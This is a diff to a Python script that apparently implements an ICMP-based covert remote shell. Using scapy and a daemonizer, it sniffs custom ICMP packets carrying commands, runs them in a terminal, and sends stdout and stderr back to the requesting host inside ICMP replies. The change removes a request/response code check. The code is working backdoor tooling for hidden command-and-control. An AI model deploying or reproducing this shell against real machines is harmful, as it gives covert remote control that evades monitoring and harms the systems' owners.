@@ -7,8 +7,7 @@ from daemoniker import Daemonizer
 from scapy.layers.inet import IP
 from scapy.layers.l2 import Ether
 from scapy.packet import bind_layers
-from scapy.sendrecv import sniff, sendp, send
-from uuid import getnode as get_mac
+from scapy.sendrecv import sniff, sendp
 
 import config
 import opening_terminal
@@ -28,9 +27,9 @@ def readstdout():
         if string == '':
             continue
         config.SEQ = config.SEQ + 1
-        packet_bytes = bytes(CustomICMP(code=config.RESPONSE_CODE) / string)
+        packet_bytes = bytes(CustomICMP() / string)
         reply_packet = (Ether(dst=destination_mac) / IP(dst=destination_ip) /
-                        CustomICMP(code=config.RESPONSE_CODE, chksum=calc_checksum(packet_bytes)) / string)
+                        CustomICMP(chksum=calc_checksum(packet_bytes)) / string)
         sendp(reply_packet, verbose=False)
         sys.stdout.write(string + "\n")
 
@@ -42,9 +41,9 @@ def readstderr():
         if string == '':
             continue
         config.SEQ = config.SEQ + 1
-        packet_bytes = bytes(CustomICMP(code=config.RESPONSE_CODE) / string)
+        packet_bytes = bytes(CustomICMP() / string)
         reply_packet = (Ether(dst=destination_mac) / IP(dst=destination_ip) /
-                        CustomICMP(code=config.RESPONSE_CODE, chksum=calc_checksum(packet_bytes)) / string)
+                        CustomICMP(chksum=calc_checksum(packet_bytes)) / string)
         sendp(reply_packet, verbose=False)
         sys.stderr.write(string + "\n")
 
@@ -57,8 +56,7 @@ def sendcommand(cmd):
 def packet_callback(packet):
     global destination_ip, destination_mac
     if packet.haslayer(CustomICMP):
-        if (packet[IP].dst != destination_ip and packet[CustomICMP].code == config.REQUEST_CODE and
-                packet[CustomICMP].id == config.ID):
+        if (packet[IP].dst != destination_ip and packet[CustomICMP].id == config.ID):
             destination_mac = packet[Ether].src
             destination_ip = packet[IP].src
             received_data = packet[CustomICMP].payload.load.decode('utf-8')
